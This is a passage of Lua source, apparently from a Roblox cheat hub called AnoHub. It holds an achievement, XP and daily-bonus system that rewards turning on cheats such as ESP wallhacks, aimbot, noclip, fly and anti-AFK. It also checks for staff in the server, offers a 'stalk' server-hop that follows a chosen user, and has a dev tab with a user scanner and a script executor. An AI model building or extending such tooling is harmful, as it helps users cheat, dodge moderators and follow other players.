            {id="hop1000",  name="Universe Traveler",  desc="Server hop 1000 times",         xp=1000,  check=function() return (statsCounter.serverHops or 0) >= 1000 end},
            {id="hop5000",  name="Interdimensional",   desc="Server hop 5000 times",         xp=4000,  check=function() return (statsCounter.serverHops or 0) >= 5000 end},
            {id="hop_auto1",  name="Auto Hopper",      desc="Enable Auto Server Hop",        xp=25,    check=function() return _G.ServerHop and _G.ServerHop.Enabled == true end},
            {id="hop_auto50", name="Nomad",            desc="Auto-hop 50 times",             xp=300,   check=function() return (statsCounter.autoHops or 0) >= 50 end},
            {id="hop_auto500",name="Vagabond",         desc="Auto-hop 500 times",            xp=1500,  check=function() return (statsCounter.autoHops or 0) >= 500 end},
            {id="hop_ping",   name="Ping Sniper",      desc="Use ping-based auto-hop",       xp=100,   check=function() return _G.ServerHop and _G.ServerHop.MaxPing > 0 end},
            {id="hop_stalk",  name="Stalker",          desc="Use stalk auto-hop",            xp=150,   check=function() return _G.ServerHop and _G.ServerHop.StalkUser ~= "" end},
            {id="rejoin1",  name="Auto Rejoin",        desc="Enable Auto-Rejoin",            xp=10,    check=function() return _G.autoRejoinActive == true end},
            {id="die1",     name="Sacrifice",          desc="Die once",                      xp=5,     check=function() return (statsCounter.deaths or 0) >= 1 end},
            {id="die10",    name="Frequent Death",     desc="Die 10 times",                  xp=30,    check=function() return (statsCounter.deaths or 0) >= 10 end},
            {id="die100",   name="Death Wish",         desc="Die 100 times",                 xp=150,   check=function() return (statsCounter.deaths or 0) >= 100 end},
            {id="die1000",  name="Immortal?",          desc="Die 1000 times",                xp=800,   check=function() return (statsCounter.deaths or 0) >= 1000 end},
            {id="die5000",  name="Death Incarnate",    desc="Die 5000 times",                xp=4000,  check=function() return (statsCounter.deaths or 0) >= 5000 end},
            {id="farm1",    name="Farmer",             desc="Start farm once",               xp=25,    check=function() return (statsCounter.farmsStarted or 0) >= 1 end},
            {id="farm25",   name="Harvester",          desc="Farm 25 times",                 xp=150,   check=function() return (statsCounter.farmsStarted or 0) >= 25 end},
            {id="farm100",  name="Money Machine",      desc="Farm 100 times",                xp=500,   check=function() return (statsCounter.farmsStarted or 0) >= 100 end},
            {id="farm500",  name="Farm Lord",          desc="Farm 500 times",                xp=2000,  check=function() return (statsCounter.farmsStarted or 0) >= 500 end},
            {id="farm1000", name="Money Overlord",     desc="Farm 1000 times",               xp=5000,  check=function() return (statsCounter.farmsStarted or 0) >= 1000 end},
            {id="time1m",   name="Just Started",       desc="Play for 1 minute",             xp=5,     check=function() return (tick() - (statsCounter.startTime or tick())) >= 60 end},
            {id="time10m",  name="Survivor",           desc="Play for 10 minutes",           xp=15,    check=function() return (tick() - (statsCounter.startTime or tick())) >= 600 end},
            {id="time1h",   name="Marathon",           desc="Play for 1 hour",               xp=100,   check=function() return (tick() - (statsCounter.startTime or tick())) >= 3600 end},
            {id="time5h",   name="Dedicated",          desc="Play for 5 hours",              xp=500,   check=function() return (tick() - (statsCounter.startTime or tick())) >= 18000 end},
            {id="time24h",  name="No Life",            desc="Play for 24 hours",             xp=2500,  check=function() return (tick() - (statsCounter.startTime or tick())) >= 86400 end},
            {id="esp1",     name="Wallhacker",         desc="Enable Player ESP",             xp=20,    check=function() return _G.espActive == true end},
            {id="npcesp1",  name="Ghost Buster",       desc="Enable NPC ESP",                xp=20,    check=function() return _G.npcESPActive == true end},
            {id="fullbright",name="Light Bringer",     desc="Enable Fullbright",             xp=10,    check=function() return (game:GetService("Lighting").Brightness or 0) >= 3 end},
            {id="xray",     name="X-Ray Vision",       desc="Enable X-Ray",                  xp=25,    check=function() return _G.xrayActive == true end},
            {id="spooky",   name="Spooky Vibes",       desc="Apply Halloween theme",         xp=75,    check=function() return _G.HalloweenThemeApplied == true end},
            {id="anus",     name="Anus Mode",          desc="Unlock the easter egg",         xp=200,   check=function() return _G.easterEggActive == true end},
            {id="rainbow",  name="Rainbow Mode",       desc="Enable Rainbow Highlight",      xp=100,   check=function() return _G.rainbowHighlightActive == true end},
            {id="wp10",     name="Waypoint Starter",   desc="Create 10 waypoints",           xp=50,    check=function() local c=0 for _ in pairs(_G.customPoints or {}) do c=c+1 end return c>=10 end},
            {id="wp50",     name="Cartographer",       desc="Create 50 waypoints",           xp=200,   check=function() local c=0 for _ in pairs(_G.customPoints or {}) do c=c+1 end return c>=50 end},
            {id="wp100",    name="Map Master",         desc="Create 100 waypoints",          xp=500,   check=function() local c=0 for _ in pairs(_G.customPoints or {}) do c=c+1 end return c>=100 end},
            {id="staff_seen",name="Staff Sighting",    desc="See a staff member",            xp=50,    check=function()
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer and _G.isStaff(plr) then return true end
                end
                return false
            end},
            {id="creator_seen",name="Creator Sighting",desc="See the creator",               xp=500,   check=function()
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer and _G.isCreator(plr) then return true end
                end
                return false
            end},
            {id="daily1",          name="Daily Login",     desc="Claim your first daily bonus", xp=25,    check=function() return (_G.totalDaysLogged or 0) >= 1 end},
            {id="daily7",          name="Week Streak",     desc="Login 7 days in a row",        xp=300,   check=function() return (_G.loginStreak or 0) >= 7 end},
            {id="daily14",         name="Two Weeks",       desc="Login 14 days in a row",       xp=600,   check=function() return (_G.loginStreak or 0) >= 14 end},
            {id="daily30",         name="Monthly Legend",  desc="Login 30 days in a row",       xp=1000,  check=function() return (_G.loginStreak or 0) >= 30 end},
            {id="daily100",        name="Century",         desc="Login 100 days total",         xp=1500,  check=function() return (_G.totalDaysLogged or 0) >= 100 end},
            {id="daily365",        name="Year One",        desc="Login 365 days total",         xp=5000,  check=function() return (_G.totalDaysLogged or 0) >= 365 end},
            {id="daily_streak_50", name="Unstoppable",     desc="Reach a 50-day streak",        xp=3000,  check=function() return (_G.loginStreak or 0) >= 50 end},
            {id="daily_streak_100",name="Hundred Streak",  desc="Reach a 100-day streak",       xp=5000,  check=function() return (_G.loginStreak or 0) >= 100 end},
            {id="daily500",        name="Consistent",      desc="Login 500 days total",         xp=5000,  check=function() return (_G.totalDaysLogged or 0) >= 500 end},
            {id="clicktp1", name="Click Master",       desc="Use Click TP",                  xp=15,    check=function() return (statsCounter.clickTPUses or 0) >= 1 end},
            {id="clicktp100",name="Click Master Pro",  desc="Use Click TP 100 times",        xp=300,   check=function() return (statsCounter.clickTPUses or 0) >= 100 end},
            {id="antiafk1", name="Not AFK",            desc="Enable Anti-AFK",               xp=10,    check=function() return _G.antiAfkActive == true end},
            {id="antivoi1", name="Void Walker",        desc="Enable Anti-Void",              xp=20,    check=function() return _G.antiVoidActive == true end},
            {id="infjump",  name="Infinite Jumper",    desc="Use Infinite Jump",             xp=15,    check=function() return _G.infiniteJumpActive == true end},
            {id="tpwalk",   name="Speed Walker",       desc="Use TP Walk",                   xp=25,    check=function() return _G.tpWalkActive == true end},
            {id="shake1",   name="Shaker",             desc="Enable Shake",                  xp=10,    check=function() return _G.shakeActive == true end},
            {id="theme_swap10",name="Fashionista",     desc="Change theme 10 times",         xp=100,   check=function() return (statsCounter.themeChanges or 0) >= 10 end},
            {id="theme_swap50",name="Stylist",         desc="Change theme 50 times",         xp=400,   check=function() return (statsCounter.themeChanges or 0) >= 50 end},
            {id="concurrent5",name="Multitasker",      desc="Have 5 features on at once",    xp=100,   check=function()
                local c = 0
                if _G.espActive then c=c+1 end
                if _G.npcESPActive then c=c+1 end
                if _G.flyActive then c=c+1 end
                if _G.noclipActive then c=c+1 end
                if _G.aimbotSettings and _G.aimbotSettings.Enabled then c=c+1 end
                if _G.lockOnActive then c=c+1 end
                if _G.xrayActive then c=c+1 end
                if _G.rainbowHighlightActive then c=c+1 end
                return c >= 5
            end},
            {id="all_on",     name="Overkill",         desc="Have 10 features on at once",   xp=1000,  check=function()
                local c = 0
                if _G.espActive then c=c+1 end
                if _G.npcESPActive then c=c+1 end
                if _G.flyActive then c=c+1 end
                if _G.noclipActive then c=c+1 end
                if _G.aimbotSettings and _G.aimbotSettings.Enabled then c=c+1 end
                if _G.lockOnActive then c=c+1 end
                if _G.xrayActive then c=c+1 end
                if _G.rainbowHighlightActive then c=c+1 end
                if _G.itemsESP then c=c+1 end
                if _G.ServerHop and _G.ServerHop.Enabled then c=c+1 end
                return c >= 10
            end},
        }

        _G.Achievements = { id = "AnoHubAchievements" }
        _G.AchievementsList = Achievements
        _G.getLevelInfo = getLevelInfo
        _G.getRank = getRank

        _G.reloadAchData = function()
            loadAch()
            if _G.refreshAchUI then pcall(_G.refreshAchUI) end
            if _G.updateXPUI then pcall(_G.updateXPUI) end
        end

        local popupGui, popupFrame, popupTitle, popupName, popupDesc, popupRank
        local popupTween = nil
        local popupActive = false

        task.spawn(function()
            task.wait(0.5)
            pcall(function()
                local pg = LocalPlayer:WaitForChild("PlayerGui", 10)
                if not pg then return end
                local old = pg:FindFirstChild("AnoHubAchPopup")
                if old then old:Destroy() end

                popupGui = Instance.new("ScreenGui")
                popupGui.Name = "AnoHubAchPopup"
                popupGui.ResetOnSpawn = false
                popupGui.IgnoreGuiInset = true
                popupGui.DisplayOrder = 999
                popupGui.Enabled = false
                popupGui.Parent = pg

                popupFrame = Instance.new("Frame")
                popupFrame.Size = UDim2.new(0, 420, 0, 120)
                popupFrame.Position = UDim2.new(0.5, -210, -0.2, 0)
                popupFrame.BackgroundColor3 = Color3.fromRGB(30, 20, 15)
                popupFrame.BackgroundTransparency = 0.1
                popupFrame.BorderSizePixel = 0
                popupFrame.Parent = popupGui

                local corner = Instance.new("UICorner")
                corner.CornerRadius = UDim.new(0, 12)
                corner.Parent = popupFrame

                local stroke = Instance.new("UIStroke")
                stroke.Color = Color3.fromRGB(215, 110, 0)
                stroke.Thickness = 2.5
                stroke.Transparency = 0.2
                stroke.Parent = popupFrame

                popupTitle = Instance.new("TextLabel")
                popupTitle.Size = UDim2.new(1, -20, 0, 30)
                popupTitle.Position = UDim2.new(0, 10, 0, 8)
                popupTitle.BackgroundTransparency = 1
                popupTitle.Text = "ACHIEVEMENT UNLOCKED!"
                popupTitle.TextColor3 = Color3.fromRGB(215, 110, 0)
                popupTitle.TextSize = 20
                popupTitle.Font = Enum.Font.GothamBold
                popupTitle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                popupTitle.TextStrokeTransparency = 0.4
                popupTitle.Parent = popupFrame

                popupName = Instance.new("TextLabel")
                popupName.Size = UDim2.new(1, -20, 0, 25)
                popupName.Position = UDim2.new(0, 10, 0, 42)
                popupName.BackgroundTransparency = 1
                popupName.Text = ""
                popupName.TextColor3 = Color3.fromRGB(255, 255, 255)
                popupName.TextSize = 18
                popupName.Font = Enum.Font.GothamBold
                popupName.Parent = popupFrame

                popupDesc = Instance.new("TextLabel")
                popupDesc.Size = UDim2.new(1, -20, 0, 20)
                popupDesc.Position = UDim2.new(0, 10, 0, 67)
                popupDesc.BackgroundTransparency = 1
                popupDesc.Text = ""
                popupDesc.TextColor3 = Color3.fromRGB(200, 200, 200)
                popupDesc.TextSize = 13
                popupDesc.Font = Enum.Font.Gotham
                popupDesc.Parent = popupFrame

                popupRank = Instance.new("TextLabel")
                popupRank.Size = UDim2.new(1, -20, 0, 22)
                popupRank.Position = UDim2.new(0, 10, 0, 75)
                popupRank.BackgroundTransparency = 1
                popupRank.Text = ""
                popupRank.TextColor3 = Color3.fromRGB(215, 110, 0)
                popupRank.TextSize = 14
                popupRank.Font = Enum.Font.Gotham
                popupRank.Parent = popupFrame
            end)
        end)

        local function showAchievementPopup(ach, isLevelUp, newLevel)
            if not popupGui or not popupFrame then return end
            if popupActive then return end
            popupActive = true

            local TweenService = game:GetService("TweenService")

            if isLevelUp then
                popupTitle.Text = "LEVEL UP!"
                popupName.Text = "You reached Level " .. newLevel
                popupName.TextColor3 = Color3.fromRGB(255, 255, 255)
                popupDesc.Text = "Rank: " .. getRank(newLevel)
                popupDesc.TextColor3 = Color3.fromRGB(215, 110, 0)
                popupRank.Text = ""
            else
                popupTitle.Text = "ACHIEVEMENT UNLOCKED!"
                popupName.Text = ach.name
                popupName.TextColor3 = Color3.fromRGB(255, 255, 255)
                popupDesc.Text = ach.desc
                popupDesc.TextColor3 = Color3.fromRGB(200, 200, 200)
                popupRank.Text = "+" .. (ach.xp or 0) .. " XP"
            end

            popupGui.Enabled = true

            if popupTween then popupTween:Cancel() end
            popupTween = TweenService:Create(popupFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Position = UDim2.new(0.5, -210, 0.15, 0),
            })
            popupTween:Play()

            task.delay(isLevelUp and 4 or 5, function()
                if popupTween then popupTween:Cancel() end
                popupTween = TweenService:Create(popupFrame, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                    Position = UDim2.new(0.5, -210, -0.2, 0),
                })
                popupTween:Play()
                popupTween.Completed:Wait()
                if popupGui then popupGui.Enabled = false end
                popupActive = false
            end)
        end

        local function notifyAch(ach)
            local oldLevel = getLevelInfo(TotalXP)
            TotalXP = TotalXP + (ach.xp or 0)
            local newLevel = getLevelInfo(TotalXP)

            showAchievementPopup(ach, false, nil)

            pcall(function()
                Library:Notify(ach.name .. " (+" .. (ach.xp or 0) .. " XP)", 6)
            end)

            if newLevel > oldLevel then
                task.wait(2.5)
                showAchievementPopup(nil, true, newLevel)
                pcall(function()
                    Library:Notify("LEVEL UP! Level " .. newLevel .. " - " .. getRank(newLevel), 8)
                end)
            end

            saveAch()
            print("[Achievements] Unlocked: " .. ach.name .. " (+" .. (ach.xp or 0) .. " XP)")
        end

        local function checkAll()
            local newUnlocks = 0
            for _, ach in ipairs(Achievements) do
                if not Unlocked[ach.id] then
                    local ok, result = pcall(ach.check)
                    if ok and result then
                        Unlocked[ach.id] = os.time()
                        notifyAch(ach)
                        newUnlocks = newUnlocks + 1
                    end
                end
            end
            if newUnlocks > 0 then
                if _G.refreshAchUI then pcall(_G.refreshAchUI) end
            end
            return newUnlocks
        end

        _G.checkAchievements = checkAll

        task.spawn(function()
            while task.wait(5) do
                pcall(checkAll)
            end
        end)

        local XPGroup       = AchTab:AddLeftGroupbox("XP / Level")
        local ProgressGroup = AchTab:AddLeftGroupbox("Progress")
        local DailyGroup    = AchTab:AddLeftGroupbox("Daily Bonus")
        local ListGroup     = AchTab:AddRightGroupbox("Achievements")

        local levelLbl = XPGroup:AddLabel("Level: 1")
        local rankLbl  = XPGroup:AddLabel("NOVICE")
        local xpLbl    = XPGroup:AddLabel("XP: 0 / 100")

        local barBg = Instance.new("Frame")
        barBg.Size = UDim2.new(1, -20, 0, 10)
        barBg.Position = UDim2.new(0, 10, 0, 4)
        barBg.BackgroundColor3 = Color3.fromRGB(50, 35, 25)
        barBg.BorderSizePixel = 0
        barBg.Parent = XPGroup.Container
        local bc = Instance.new("UICorner")
        bc.CornerRadius = UDim.new(1, 0)
        bc.Parent = barBg

        local barFill = Instance.new("Frame")
        barFill.Size = UDim2.new(0, 0, 1, 0)
        barFill.BackgroundColor3 = Color3.fromRGB(215, 110, 0)
        barFill.BorderSizePixel = 0
        barFill.Parent = barBg
        local bfc = Instance.new("UICorner")
        bfc.CornerRadius = UDim.new(1, 0)
        bfc.Parent = barFill

        XPGroup:AddLabel("")

        local function updateXPUI()
            local level, curXP, needXP = getLevelInfo(TotalXP)
            local rank = getRank(level)
            pcall(function() levelLbl:SetText("Level: " .. level) end)
            pcall(function() rankLbl:SetText(rank) end)
            pcall(function() xpLbl:SetText("XP: " .. math.floor(curXP) .. " / " .. math.floor(needXP) .. "  (Total: " .. math.floor(TotalXP) .. ")") end)
            local pct = math.clamp(curXP / needXP, 0, 1)
            pcall(function() barFill.Size = UDim2.new(pct, 0, 1, 0) end)
        end
        _G.updateXPUI = updateXPUI

        local totalLbl   = ProgressGroup:AddLabel("Total: 0/" .. #Achievements)
        local percentLbl = ProgressGroup:AddLabel("Completion: 0%")

        ProgressGroup:AddDivider()
        ProgressGroup:AddButton({
            Text = "Recheck All",
            Tooltip = "Recheck all achievements",
            Func = function()
                local n = checkAll()
                Library:Notify("New unlocks: " .. n, 4)
            end,
        })
        ProgressGroup:AddButton({
            Text = "Save",
            Tooltip = "Save progress",
            Func = function()
                saveAch()
                Library:Notify("Saved!", 3)
            end,
        })
        ProgressGroup:AddButton({
            Text = "Reset All",
            Tooltip = "Reset all achievements & XP",
            Func = function()
                Unlocked = {}
                TotalXP = 0
                saveAch()
                Library:Notify("Reset! All achievements and XP cleared", 4)
                if _G.refreshAchUI then _G.refreshAchUI() end
                if _G.updateXPUI then _G.updateXPUI() end
            end,
        })

        local achLabels = {}
        for _, ach in ipairs(Achievements) do
            local lbl = ListGroup:AddLabel("❌ " .. ach.name .. " - " .. ach.desc .. " (+" .. ach.xp .. " XP)")
            achLabels[ach.id] = { label = lbl, ach = ach }
        end

        function _G.refreshAchUI()
            local unlocked = 0
            for _, ach in ipairs(Achievements) do
                local entry = achLabels[ach.id]
                if entry and entry.label then
                    if Unlocked[ach.id] then
                        unlocked = unlocked + 1
                        pcall(function() entry.label:SetText("✅ " .. ach.name .. " - " .. ach.desc .. " (+" .. ach.xp .. " XP)") end)
                    else
                        pcall(function() entry.label:SetText("❌ " .. ach.name .. " - " .. ach.desc .. " (+" .. ach.xp .. " XP)") end)
                    end
                end
            end
            local pct = math.floor((unlocked / #Achievements) * 100)
            pcall(function() totalLbl:SetText("Total: " .. unlocked .. "/" .. #Achievements) end)
            pcall(function() percentLbl:SetText("Completion: " .. pct .. "%") end)
            if _G.updateXPUI then pcall(_G.updateXPUI) end
        end

        local DAILY_FILE = "AnoHub_daily.json"
        local DailyData = {
            lastClaim = 0,
            streak    = 0,
            totalDays = 0,
        }
        _G.loginStreak = 0
        _G.totalDaysLogged = 0

        local function loadDaily()
            pcall(function()
                if readfile and isfile and isfile(DAILY_FILE) then
                    local data = readfile(DAILY_FILE)
                    if data and data ~= "" then
                        local ok, parsed = pcall(function()
                            return HttpService:JSONDecode(data)
                        end)
                        if ok and type(parsed) == "table" then
                            DailyData.lastClaim = parsed.lastClaim or 0
                            DailyData.streak    = parsed.streak or 0
                            DailyData.totalDays = parsed.totalDays or 0
                        end
                    end
                end
            end)
            _G.loginStreak = DailyData.streak
            _G.totalDaysLogged = DailyData.totalDays
        end

        local function saveDaily()
            pcall(function()
                if writefile then
                    writefile(DAILY_FILE, HttpService:JSONEncode(DailyData))
                end
            end)
        end

        loadDaily()

        local DAY_SECONDS = 24 * 60 * 60

        local function canClaimDaily()
            return (os.time() - DailyData.lastClaim) >= DAY_SECONDS
        end

        local function claimDaily()
            if not canClaimDaily() then
                local remaining = DAY_SECONDS - (os.time() - DailyData.lastClaim)
                local hours = math.floor(remaining / 3600)
                local mins  = math.floor((remaining % 3600) / 60)
                Library:Notify("Daily already claimed! Come back in " .. hours .. "h " .. mins .. "m", 5)
                return false
            end

            if DailyData.lastClaim > 0 and (os.time() - DailyData.lastClaim) < (DAY_SECONDS * 2) then
                DailyData.streak = DailyData.streak + 1
            else
                DailyData.streak = 1
            end

            DailyData.lastClaim = os.time()
            DailyData.totalDays = DailyData.totalDays + 1
            _G.loginStreak = DailyData.streak
            _G.totalDaysLogged = DailyData.totalDays

            local baseXP = 50
            local streakBonus = math.min(DailyData.streak * 10, 200)
            local totalBonus = baseXP + streakBonus

            local oldLevel = getLevelInfo(TotalXP)
            TotalXP = TotalXP + totalBonus
            local newLevel = getLevelInfo(TotalXP)

            saveDaily()
            saveAch()

            showAchievementPopup({
                name = "Daily Bonus Claimed!",
                desc = "Day " .. DailyData.streak .. " streak  -  +" .. totalBonus .. " XP",
                xp = totalBonus,
            }, false, nil)

            pcall(function()
                Library:Notify("Daily Bonus! +" .. totalBonus .. " XP (Streak: " .. DailyData.streak .. " days)", 8)
            end)

            if newLevel > oldLevel then
                task.wait(3)
                showAchievementPopup(nil, true, newLevel)
            end

            if _G.updateXPUI then pcall(_G.updateXPUI) end
            if _G.refreshAchUI then pcall(_G.refreshAchUI) end
            return true
        end
        _G.claimDaily = claimDaily

        local dailyStreakLbl = DailyGroup:AddLabel("Streak: 0 days")
        local dailyTotalLbl  = DailyGroup:AddLabel("Total logins: 0")
        local dailyStatusLbl = DailyGroup:AddLabel("Checking...")

        local function updateDailyUI()
            pcall(function()
                dailyStreakLbl:SetText("Streak: " .. DailyData.streak .. " days")
                dailyTotalLbl:SetText("Total logins: " .. DailyData.totalDays)
                if canClaimDaily() then
                    dailyStatusLbl:SetText("Ready to claim!")
                else
                    local remaining = DAY_SECONDS - (os.time() - DailyData.lastClaim)
                    local hours = math.floor(remaining / 3600)
                    local mins  = math.floor((remaining % 3600) / 60)
                    dailyStatusLbl:SetText("Next in: " .. hours .. "h " .. mins .. "m")
                end
            end)
        end

        DailyGroup:AddButton({
            Text = "Claim Daily Bonus",
            Tooltip = "Claim your daily XP reward",
            Func = function()
                claimDaily()
                updateDailyUI()
            end,
        })

        DailyGroup:AddDivider()
        DailyGroup:AddLabel("Base: +50 XP", true)
        DailyGroup:AddLabel("Streak bonus: +10 XP/day (max +200)", true)

        task.spawn(function()
            updateDailyUI()
            while task.wait(60) do
                pcall(updateDailyUI)
            end
        end)

        task.spawn(function()
            task.wait(3)
            if canClaimDaily() then
                Library:Notify("Daily bonus available! Open Achievements tab", 8)
            end
        end)

        task.spawn(function()
            while task.wait(5) do
                pcall(function()
                    local unlockedCount = 0
                    local recent = {}
                    local sortedIDs = {}

                    for id, timestamp in pairs(Unlocked) do
                        unlockedCount = unlockedCount + 1
                        table.insert(sortedIDs, {id = id, time = timestamp or 0})
                    end

                    table.sort(sortedIDs, function(a, b)
                        return a.time > b.time
                    end)

                    for i, entry in ipairs(sortedIDs) do
                        if i > 10 then break end
                        for _, ach in ipairs(Achievements) do
                            if ach.id == entry.id then
                                table.insert(recent, ach.name)
                                break
                            end
                        end
                    end

                    local level = getLevelInfo(TotalXP)

                    _G.AchievementsData = {
                        unlocked = unlockedCount,
                        total    = #Achievements,
                        xp       = math.floor(TotalXP),
                        level    = level,
                        rank     = getRank(level),
                        recent   = recent,
                    }
                end)
            end
        end)

        task.spawn(function()
            task.wait(1.5)
            _G.refreshAchUI()
            if _G.updateXPUI then pcall(_G.updateXPUI) end
            checkAll()
        end)

        print("[AnoHub] Achievements tab loaded. Total: " .. #Achievements)
    end
	    if _G.isDevUser and _G.isDevUser() then
        _G.Tabs.Dev = _G.Window:AddTab("Dev", "hammer")
        local DevTab = _G.Tabs.Dev

        local AchManageGroup = DevTab:AddLeftGroupbox("Achievement Manager")

        local function getAchList()
            return _G.AchievementsList or {}
        end

        if #getAchList() == 0 then
            AchManageGroup:AddLabel("Loading achievements...", true)
            AchManageGroup:AddLabel("Wait a few seconds and reopen Dev tab", true)
        else
            local ACH_FILE = "AnoHub_achievements.json"

            local function loadUnlocked()
                local result = {}
                pcall(function()
                    if readfile and isfile and isfile(ACH_FILE) then
                        local data = readfile(ACH_FILE)
                        if data and data ~= "" then
                            local ok, parsed = pcall(function()
                                return HttpService:JSONDecode(data)
                            end)
                            if ok and type(parsed) == "table" then
                                result = parsed.unlocked or {}
                            end
                        end
                    end
                end)
                return result
            end

            local function getTotalXP()
                local xp = 0
                pcall(function()
                    if readfile and isfile and isfile(ACH_FILE) then
                        local data = readfile(ACH_FILE)
                        local parsed = HttpService:JSONDecode(data)
                        xp = parsed.totalXP or 0
                    end
                end)
                return xp
            end

            local function saveUnlocked(unlocked, totalXP)
                pcall(function()
                    if writefile then
                        writefile(ACH_FILE, HttpService:JSONEncode({
                            unlocked = unlocked,
                            totalXP = totalXP or 0,
                        }))
                    end
                end)
            end

            local statusLbl = AchManageGroup:AddLabel("Loading...")

            local function updateStatus()
                local unlocked = loadUnlocked()
                local count = 0
                for _ in pairs(unlocked) do count = count + 1 end
                local total = #getAchList()
                statusLbl:SetText("Unlocked: " .. count .. " / " .. total)
            end
            updateStatus()

            AchManageGroup:AddDivider()

            local achNames = {}
            local achIdByName = {}
            for _, ach in ipairs(getAchList()) do
                table.insert(achNames, ach.name)
                achIdByName[ach.name] = ach.id
            end
            table.sort(achNames)

            local selectedAch = achNames[1] or "None"

            AchManageGroup:AddDropdown("DevAchSelect", {
                Text = "Select Achievement",
                Values = achNames,
                Default = selectedAch,
                Tooltip = "Choose achievement to give/remove",
                Callback = function(Value) selectedAch = Value end,
            })

            AchManageGroup:AddButton({
                Text = "✅ Give Selected",
                Tooltip = "Unlock the selected achievement",
                Func = function()
                    local achId = achIdByName[selectedAch]
                    if not achId then
                        Library:Notify("Achievement not found", 4)
                        return
                    end

                    local unlocked = loadUnlocked()
                    if unlocked[achId] then
                        Library:Notify("Already unlocked: " .. selectedAch, 4)
                        return
                    end

                    unlocked[achId] = os.time()

                    local xpReward = 0
                    for _, ach in ipairs(getAchList()) do
                        if ach.id == achId then
                            xpReward = ach.xp or 0
                            break
                        end
                    end

                    local newXP = getTotalXP() + xpReward
                    saveUnlocked(unlocked, newXP)

                    Library:Notify("Given: " .. selectedAch .. " (+" .. xpReward .. " XP)", 5)

                    if _G.reloadAchData then pcall(_G.reloadAchData) end
                    updateStatus()
                end,
            })

            AchManageGroup:AddButton({
                Text = "❌ Remove Selected",
                Tooltip = "Remove the selected achievement",
                Func = function()
                    local achId = achIdByName[selectedAch]
                    if not achId then
                        Library:Notify("Achievement not found", 4)
                        return
                    end

                    local unlocked = loadUnlocked()
                    if not unlocked[achId] then
                        Library:Notify("Not unlocked: " .. selectedAch, 4)
                        return
                    end

                    unlocked[achId] = nil

                    local xpReward = 0
                    for _, ach in ipairs(getAchList()) do
                        if ach.id == achId then
                            xpReward = ach.xp or 0
                            break
                        end
                    end

                    local newXP = math.max(0, getTotalXP() - xpReward)
                    saveUnlocked(unlocked, newXP)

                    Library:Notify("Removed: " .. selectedAch .. " (-" .. xpReward .. " XP)", 5)

                    if _G.reloadAchData then pcall(_G.reloadAchData) end
                    updateStatus()
                end,
            })

            AchManageGroup:AddDivider()

            AchManageGroup:AddButton({
                Text = "Give ALL Achievements",
                Tooltip = "Unlock every achievement",
                Func = function()
                    local unlocked = {}
                    local totalXP = 0
                    for _, ach in ipairs(getAchList()) do
                        unlocked[ach.id] = os.time()
                        totalXP = totalXP + (ach.xp or 0)
                    end
                    saveUnlocked(unlocked, totalXP)
                    Library:Notify("Gave ALL achievements! Total XP: " .. totalXP, 6)
                    if _G.reloadAchData then pcall(_G.reloadAchData) end
                    updateStatus()
                end,
            })

            AchManageGroup:AddButton({
                Text = "Remove ALL Achievements",
                Tooltip = "Lock every achievement and reset XP to 0",
                Func = function()
                    saveUnlocked({}, 0)
                    Library:Notify("Removed ALL achievements & XP", 6)
                    if _G.reloadAchData then pcall(_G.reloadAchData) end
                    updateStatus()
                end,
            })

            AchManageGroup:AddDivider()

            AchManageGroup:AddLabel("XP Controls")

            local xpInput = 500
            AchManageGroup:AddInput("DevXPAmount", {
                Text = "XP Amount",
                Default = "500",
                Placeholder = "500",
                Numeric = true,
                Finished = false,
                Tooltip = "Amount of XP to add/remove",
                Callback = function(v) xpInput = tonumber(v) or 0 end,
            })

            AchManageGroup:AddButton({
                Text = "Add XP",
                Tooltip = "Add XP to total",
                Func = function()
                    local unlocked = loadUnlocked()
                    local newXP = getTotalXP() + xpInput
                    saveUnlocked(unlocked, newXP)
                    Library:Notify("Added " .. xpInput .. " XP (Total: " .. newXP .. ")", 4)
                    if _G.reloadAchData then pcall(_G.reloadAchData) end
                end,
            })

            AchManageGroup:AddButton({
                Text = "Remove XP",
                Tooltip = "Remove XP from total",
                Func = function()
                    local unlocked = loadUnlocked()
                    local newXP = math.max(0, getTotalXP() - xpInput)
                    saveUnlocked(unlocked, newXP)
                    Library:Notify("Removed " .. xpInput .. " XP (Total: " .. newXP .. ")", 4)
                    if _G.reloadAchData then pcall(_G.reloadAchData) end
                end,
            })

            AchManageGroup:AddDivider()
            AchManageGroup:AddButton({
                Text = "Refresh Status",
                Tooltip = "Refresh unlocked count",
                Func = function()
                    updateStatus()
                    Library:Notify("Refreshed", 3)
                end,
            })
            AchManageGroup:AddButton({
                Text = "Reload UI from File",
                Tooltip = "Force reload achievements UI",
                Func = function()
                    if _G.reloadAchData then
                        pcall(_G.reloadAchData)
                        Library:Notify("UI reloaded", 3)
                    else
                        Library:Notify("reload function not found", 4)
                    end
                    updateStatus()
                end,
            })
        end

        local AnoHubUsersGroup = DevTab:AddLeftGroupbox("AnoHub Users")

        local anoHubListLabel = AnoHubUsersGroup:AddLabel("Scanning...")
        local anoHubCountLabel = AnoHubUsersGroup:AddLabel("Total: 0")

        local function updateAnoHubList()
            local users = {}
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and _G.isAnoHubUser and _G.isAnoHubUser(plr) then
                    table.insert(users, plr.Name)
                end
            end
            local text = ""
            for _, name in ipairs(users) do
                text = text .. name .. "\n"
            end
            if text == "" then text = "No AnoHub users found" end
            anoHubListLabel:SetText(text)
            anoHubCountLabel:SetText("Total: " .. #users)
        end

        AnoHubUsersGroup:AddButton({
            Text = "Rescan Users",
            Tooltip = "Rescan all players",
            Func = function()
                updateAnoHubList()
                Library:Notify("Rescan done", 3)
            end,
        })

        AnoHubUsersGroup:AddToggle("AnoHubUsersESP", {
            Text = "AnoHub Users ESP",
            Default = true,
            Tooltip = "Highlight AnoHub users",
            Callback = function(Value)
                _G.espOptions.anoHub = Value
            end,
        })

        task.spawn(function()
            while task.wait(5) do
                pcall(updateAnoHubList)
            end
        end)

        local ExecGroup = DevTab:AddLeftGroupbox("Mini Executor")

        local mainFrame = Instance.new("Frame")
        mainFrame.Size = UDim2.new(1, -20, 0, 250)
        mainFrame.Position = UDim2.new(0, 10, 0, 30)
        mainFrame.BackgroundColor3 = Color3.fromRGB(30, 25, 20)
